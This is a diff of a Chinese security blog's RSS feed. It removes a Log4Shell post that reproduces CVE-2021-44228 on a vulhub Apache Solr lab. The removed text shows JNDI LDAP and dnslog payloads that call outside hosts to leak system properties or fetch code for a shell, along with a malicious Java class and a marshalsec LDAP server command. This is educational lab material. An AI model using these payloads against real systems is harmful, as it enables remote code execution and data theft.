@@ -5,433 +5,56 @@
         <link>https://k1t0111.github.io</link>
         <description>一点小分享</description>
         <language>zh-CN</language>
-        <pubDate>Sat, 17 Aug 2024 10:17:27 +0800</pubDate>
-        <lastBuildDate>Sat, 17 Aug 2024 10:17:27 +0800</lastBuildDate>
-        <category>Android移动开发</category>
-        <category>CTF</category>
-        <category>枚举AD</category>
-        <category>cors</category>
-        <category>渗透靶场</category>
+        <pubDate>Sat, 30 Nov 2024 22:10:02 +0800</pubDate>
+        <lastBuildDate>Sat, 30 Nov 2024 22:10:02 +0800</lastBuildDate>
         <category>top10及相关漏洞</category>
-        <category>渗透工具</category>
-        <category>tryhackme</category>
-        <category>sql注入</category>
-        <category>vulnhub</category>
-        <category>ssrf</category>
-        <category>攻击</category>
-        <category>博客搭建</category>
-        <category>hackmyvm</category>
-        <category>JAVA</category>
-        <category>Hackthebox</category>
-        <category>漏洞分析</category>
-        <category>SQL</category>
-        <category>权限提升</category>
-        <category>信息收集</category>
-        <category>计算机组成原理</category>
-        <category>安全设备</category>
-        <category>操作系统</category>
-        <category>文件上传</category>
-        <category>信息安全数学基础</category>
-        <category>横向移动</category>
-        <category>xss</category>
-        <category>算法</category>
         <category>计算机网络</category>
+        <category>漏洞分析</category>
         <item>
-            <guid isPermalink="true">https://k1t0111.github.io/2024/08/17/log4shell/</guid>
-            <title>log4shell</title>
-            <link>https://k1t0111.github.io/2024/08/17/log4shell/</link>
+            <guid isPermalink="true">https://k1t0111.github.io/2024/11/30/%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%9E%9A%E4%B8%BE/</guid>
+            <title>短文件名枚举</title>
+            <link>https://k1t0111.github.io/2024/11/30/%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%9E%9A%E4%B8%BE/</link>
             <category>漏洞分析</category>
-            <pubDate>Sat, 17 Aug 2024 10:17:27 +0800</pubDate>
-            <description><![CDATA[ &lt;h3 id=&#34;log4j-2x&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#log4j-2x&#34;&gt;#&lt;/a&gt; &lt;strong&gt;Log4j 2.x&lt;/strong&gt;:&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;Log4j 2.x 版本在 2021 年发现了一个严重的 JNDI 注入漏洞（CVE-2021-44228），也称为 Log4Shell 漏洞。该漏洞允许攻击者通过 JNDI 查找恶意代码来远程执行代码，影响范围广泛。这个漏洞在 Log4j 2.0 到 2.14.1 版本中存在，并已在 2.15.0 及后续版本中得到修复&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Apache log4j 是 Apache 的一个开源项目，Apache log4j 2 是一个就 Java 的日志记录工具。通过重写了 log4j 框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI 组建等，被应用于业务系统开发，用于记录程序输入输出日志信息。log4j2 中存在&lt;strong&gt; JNDI 注入漏洞&lt;/strong&gt;，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上执行任意代码&lt;/p&gt;
-&lt;h3 id=&#34;jndi简单介绍&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jndi简单介绍&#34;&gt;#&lt;/a&gt; JNDI 简单介绍&lt;/h3&gt;
-&lt;p&gt;JNDI (Java Naming and Directory Interface,Java 命名和目录接口) 是 SUN 公司提供的一种标准的 Java 命名系统接口，JNDI 提供统一的客户端 API，通过不同的访问提供者接口 JNDI 服务供应接口 (SPI) 的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。&lt;br /&gt;
-JNDI 注入主要是用过下载远程 class，来运行恶意代码。JNDI 注入攻击时常用的就是通过 RMI 和 LDAP 两种服务。&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240806105256.png&#34; alt=&#34;image.png&#34; /&gt;&lt;br /&gt;
-&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/8a6d0c48141bbdaaceb44fe403ddb125.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;漏洞验证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞验证&#34;&gt;#&lt;/a&gt; 漏洞验证:&lt;/h4&gt;
-&lt;p&gt;一般来讲 log4j 的漏洞，是一种严重的漏洞，因为他覆盖面广，使用广泛，因此可以看到我们对于 log4&lt;br /&gt;
-j，一般都是在一些大型的服务器上的安装的组件的上面去验证。&lt;/p&gt;
-&lt;h4 id=&#34;漏洞分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞分析&#34;&gt;#&lt;/a&gt; 漏洞分析:&lt;/h4&gt;
-&lt;p&gt;最主要还是 log4j 可以通过特定的形式例如:${} 来进行一个查询替换的功能，例如我们的环境变量。因此还可以暴露敏感信息。但是他不仅可以查找变量进行替换还可以使用 ，jndi 的查询服务可以查询目录和命名服务。之后就可以利用 rmi 或者 ldap 去访问我们的 web 服务器上的相关 class 文件，下载之后执行再反弹 shell 回到我们的攻击机器。&lt;/p&gt;
-&lt;h5 id=&#34;以minecraft为例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#以minecraft为例&#34;&gt;#&lt;/a&gt; 以 minecraft 为例&lt;/h5&gt;
-&lt;p&gt;Minecraft 服务器是专门为 Minecraft 游戏设计的，它们允许玩家在 Minecraft 游戏中进行多人游戏和互动。这些服务器使用特定的 Minecraft 服务器软件来运行，这些软件是为支持 Minecraft 游戏而开发的。具体来说，Minecraft Java Edition 使用的服务器软件称为 Minecraft: Java Edition Server，而 Minecraft Bedrock Edition（如手机版、Windows 10 版等）使用的服务器软件称为 Minecraft Bedrock Edition Server。&lt;/p&gt;
-&lt;p&gt;因此，Minecraft 服务器不是通用的服务器，不能像一般的 Web 服务器或游戏服务器那样用于其他用途。它们专门设计用于运行 Minecraft 游戏，管理游戏世界、玩家互动和游戏规则。&lt;/p&gt;
-&lt;p&gt;因此我们需要一个相应版本的启动器。然后连接服务器在游戏中输入我们的 payload。${jndi:ldap:ip/a} 下载对应的 web 服务器上的 payload 从而 getshell&lt;/p&gt;
-&lt;h4 id=&#34;不同服务器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#不同服务器&#34;&gt;#&lt;/a&gt; 不同服务器&lt;/h4&gt;
-&lt;p&gt;不同环境依赖，不同服务器对于 log4j 记录接口是不一样的。因此可能触发点虽然都是 ${} 但是我们输入的位置和接口不一样，要随机而变。&lt;/p&gt;
-&lt;h3 id=&#34;漏洞复现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞复现&#34;&gt;#&lt;/a&gt; 漏洞复现&lt;/h3&gt;
-&lt;p&gt;根据 vulhub 官方给出的漏洞环境进行复现。&lt;br /&gt;
-Apache Log4j2 不是一个特定的 Web 服务，而仅仅是一个第三方库，我们可以通过找到一些使用了这个库的应用来复现这个漏洞，比如 Apache Solr。&lt;/p&gt;
-&lt;p&gt;执行如下命令启动一个 Apache Solr 8.11.0，其依赖了 Log4j 2.14.1：&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;docker&lt;/span&gt; compose up &lt;span class=&#34;token parameter variable&#34;&gt;-d&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;服务启动后，访问 &lt;code&gt;http://your-ip:8983&lt;/code&gt;  即可查看到 Apache Solr 的后台页面。可以看到这就是&lt;br /&gt;
- Apache Solr 是一个可以作为服务运行的应用程序。它通常以服务器模式运行，接受来自客户端的搜索请求，并返回搜索结果。Solr 提供了一个 HTTP 接口，可以通过 RESTful API 进行操作。这使得 Solr 可以方便地与其他应用程序集成，通过 Web 请求进行数据索引和搜索查询。&lt;/p&gt;
-&lt;p&gt;Solr 还支持配置为集群模式，以处理大规模的数据和高负载的搜索请求。它具有许多功能，如分布式搜索、实时索引、负载均衡和自动故障转移，适用于大规模和高性能的搜索需求&lt;/p&gt;
-&lt;h5 id=&#34;验证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#验证&#34;&gt;#&lt;/a&gt; 验证&lt;/h5&gt;
-&lt;p&gt;一般验证都是用 dnslog&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$&amp;#123;jndi&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;dns&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;$&amp;#123;sys&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;java.version&amp;#125;&lt;/span&gt;.example.com&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;在 Log4j 中， &lt;code&gt;$&amp;#123;sys:java.version&amp;#125;&lt;/code&gt;  是一种使用变量替换的语法，用于在日志配置文件中插入动态值。&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;$&amp;#123;sys:java.version&amp;#125;&lt;/code&gt;  是一个占位符，表示 Log4j 会用实际的系统属性值来替换它。&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;sys&lt;/code&gt;  表示这是一个系统属性的占位符。&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;java.version&lt;/code&gt;  是要替换的具体系统属性的名称。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;在这个例子中， &lt;code&gt;java.version&lt;/code&gt;  是一个 Java 系统属性，它包含了当前运行的 Java 版本信息。Log4j 会在解析配置文件时用这个系统属性的实际值替换  &lt;code&gt;$&amp;#123;sys:java.version&amp;#125;&lt;/code&gt; 。&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240811221326.png&#34; alt=&#34;image.png&#34; /&gt;&lt;br /&gt;
- 此时我们的环境已经起来了，可以看到这个就是 solar admin 系统。我们需要找到 log4j 记录的地方，&lt;/p&gt;
-&lt;h4 id=&#34;核心&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#核心&#34;&gt;#&lt;/a&gt; 核心&lt;/h4&gt;
-&lt;p&gt;在 Apache Solr 中， &lt;code&gt;/solr/admin/cores&lt;/code&gt;  是 Solr 的一个管理路径，用于操作和管理 Solr 的 “cores”（核心）。以下是这个路径的主要用途：&lt;/p&gt;
-&lt;h3 id=&#34;主要功能&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#主要功能&#34;&gt;#&lt;/a&gt; &lt;strong&gt;主要功能&lt;/strong&gt;&lt;/h3&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;列出核心&lt;/strong&gt;:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;访问  &lt;code&gt;http://&amp;lt;host&amp;gt;:&amp;lt;port&amp;gt;/solr/admin/cores?action=STATUS&lt;/code&gt;  可以查看当前 Solr 实例中的所有核心及其状态。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;查看核心状态&lt;/strong&gt;:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;提供核心的运行状态、配置信息和统计数据，帮助监控和管理 Solr 的各个核心。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;管理核心&lt;/strong&gt;:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;通过这个路径，你可以执行各种管理操作，比如重新加载、卸载、创建新核心等。例如：
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;http://&amp;lt;host&amp;gt;:&amp;lt;port&amp;gt;/solr/admin/cores?action=RELOAD&amp;amp;core=&amp;lt;core_name&amp;gt;&lt;/code&gt;  用于重新加载指定核心。&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;http://&amp;lt;host&amp;gt;:&amp;lt;port&amp;gt;/solr/admin/cores?action=UNLOAD&amp;amp;core=&amp;lt;core_name&amp;gt;&lt;/code&gt;  用于卸载指定核心。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&#34;示例使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#示例使用&#34;&gt;#&lt;/a&gt; &lt;strong&gt;示例使用&lt;/strong&gt;&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;列出所有核心&lt;/strong&gt;:&lt;/p&gt;
-&lt;p&gt;Copy Code&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;http://&amp;lt;host&amp;gt;:&amp;lt;port&amp;gt;/solr/admin/cores?action=STATUS&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;这将返回一个 JSON 格式的响应，包含所有核心的详细状态信息。&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;重新加载核心&lt;/strong&gt;:&lt;/p&gt;
-&lt;p&gt;Copy Code&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;http://&amp;lt;host&amp;gt;:&amp;lt;port&amp;gt;/solr/admin/cores?action=RELOAD&amp;amp;core=my_core&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;这将重新加载名为  &lt;code&gt;my_core&lt;/code&gt;  的核心，适用于配置变更后需要重新加载核心的情况。&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;如何访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#如何访问&#34;&gt;#&lt;/a&gt; &lt;strong&gt;如何访问&lt;/strong&gt;&lt;/h3&gt;
-&lt;p&gt;确保 Solr 实例正在运行，并且你能够通过指定的主机和端口访问 Solr。访问  &lt;code&gt;/solr/admin/cores&lt;/code&gt;  可以帮助你进行核心的监控和管理工作，是 Solr 系统管理中的重要一环。&lt;/p&gt;
-&lt;p&gt;Solr 的查询记录和其他重要事件通常会被记录在 log4j 日志中。Solr 使用 log4j 进行日志记录，具体的日志记录位置和详细程度可以通过 log4j 配置文件进行设置。查询记录、错误信息、系统状态等会被写入到指定的日志文件中，帮助你监控和调试 Solr 实例。通过这一点，我们可以触发 ${} 进行替换触发。&lt;/p&gt;
-&lt;h4 id=&#34;利用链&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用链&#34;&gt;#&lt;/a&gt; 利用链&lt;/h4&gt;
-&lt;h5 id=&#34;dnslog验证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dnslog验证&#34;&gt;#&lt;/a&gt; dnslog 验证&lt;/h5&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/solr/admin/cores?action&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$&amp;#123;jndi&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;dns&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;$&amp;#123;sys&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;java.version&amp;#125;&lt;/span&gt;.45046de8.log.dnslog.biz.&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240811230754.png&#34; alt=&#34;image.png&#34; /&gt;&lt;br /&gt;
- 很明显利用成功。&lt;br /&gt;
-既然证明存在现在我们的想法肯定是想利用 ldap 服务器进行一个 rce，因为 jndi 查询服务不仅可以查询 dns 服务还可以查询 ldap 服务。ldap 又可以访问我们的 web 服务。从而让服务器下载对应的恶意 web&lt;br /&gt;
-java class 文件从而执行&lt;/p&gt;
-&lt;h5 id=&#34;rce&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rce&#34;&gt;#&lt;/a&gt; rce&lt;/h5&gt;
-&lt;h6 id=&#34;准备恶意文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#准备恶意文件&#34;&gt;#&lt;/a&gt; 准备恶意文件&lt;/h6&gt;
-&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;package&lt;/span&gt; &lt;span class=&#34;token namespace&#34;&gt;org&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;com&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;test&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token import&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;IOException&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; log4j &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; args&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        log4j exploit &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt;  &lt;span class=&#34;token function&#34;&gt;log4j&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;log4j&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token class-name&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getRuntime&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;calc&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;IOException&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;printStackTrace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt; &lt;code&gt;Runtime.getRuntime().exec(&amp;quot;calc&amp;quot;);&lt;/code&gt; &lt;/strong&gt;:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;Runtime.getRuntime()&lt;/code&gt;  返回当前应用程序的运行时对象，该对象允许应用程序与运行环境进行交互。&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;exec(&amp;quot;calc&amp;quot;)&lt;/code&gt;  方法用于执行指定的系统命令。在 Windows 操作系统上， &lt;code&gt;&amp;quot;calc&amp;quot;&lt;/code&gt;  是启动计算器的命令。因此，这行代码试图启动计算器应用程序。&lt;/li&gt;
-&lt;li&gt;如果你在其他操作系统上运行这个代码（比如 macOS 或 Linux）， &lt;code&gt;&amp;quot;calc&amp;quot;&lt;/code&gt;  可能不会有任何效果，因为计算器的命令在不同操作系统上是不同的。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt; &lt;code&gt;catch (IOException e)&lt;/code&gt; &lt;/strong&gt;:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;IOException&lt;/code&gt;  是一个异常，表示在输入或输出操作中发生了问题。在这里，它用于捕获  &lt;code&gt;exec&lt;/code&gt;  方法可能抛出的异常（例如命令无法执行或文件无法找到）。&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;e.printStackTrace();&lt;/code&gt;  用于打印异常的堆栈跟踪，以帮助调试和找出错误的具体&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240811232320.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240814224511.png&#34; alt=&#34;image.png&#34; /&gt;&lt;br /&gt;
- 先开启一个 web 服务 ，之后利用工具创建 ldap 服务器之后开始攻击。&lt;/p&gt;
-&lt;h5 id=&#34;准备ldap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#准备ldap&#34;&gt;#&lt;/a&gt; 准备 ldap&lt;/h5&gt;
-&lt;p&gt;我们需要使用 jndi 找到 ldap 服务，之后使用 ldap 的功能去访问我们的 web 服务器。&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;完事具备就差 ldap 服务器&lt;/th&gt;
-&lt;th&gt;&lt;a href=&#34;marshalsec.md#**%E5%BC%80%E5%90%AFLDAP%E6%9C%8D%E5%8A%A1&#34;&gt;** 开启 LDAP 服务&lt;/a&gt;&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;/table&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;java&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-cp&lt;/span&gt; target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:1234/&lt;span class=&#34;token comment&#34;&gt;#log4j 1389&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这个可以直接确定 ldap 端口和 ldap 响应的 url&lt;br /&gt;
-&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240814225636.png&#34; alt=&#34;image.png&#34; /&gt;&lt;br /&gt;
- 我们必须在 class 文件中省略 class 后缀只能用 #名字&lt;br /&gt;
- Listening on 0.0.0.0:1389&lt;br /&gt;
- 已经启动此时我们需要直接触发链条&lt;/p&gt;
-&lt;h4 id=&#34;payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload&#34;&gt;#&lt;/a&gt; ***payload&lt;/h4&gt;
